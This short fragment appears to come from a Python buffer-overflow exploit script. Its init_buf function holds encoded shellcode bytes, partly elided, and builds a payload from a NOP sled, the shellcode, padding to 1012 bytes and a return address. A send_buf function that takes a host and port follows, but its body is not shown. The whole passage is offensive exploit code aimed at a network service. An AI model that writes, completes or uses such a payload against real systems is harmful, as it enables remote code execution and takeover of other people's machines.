...
def init_buf():
    shell_code = \
        b"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30" + \
    ...
    buf = ((b"\x90" * 4 + shell_code).ljust(1012, b"\x90") + retaddr).ljust(2000, b"\x90")

    return buf


def send_buf(buffer, host, port):
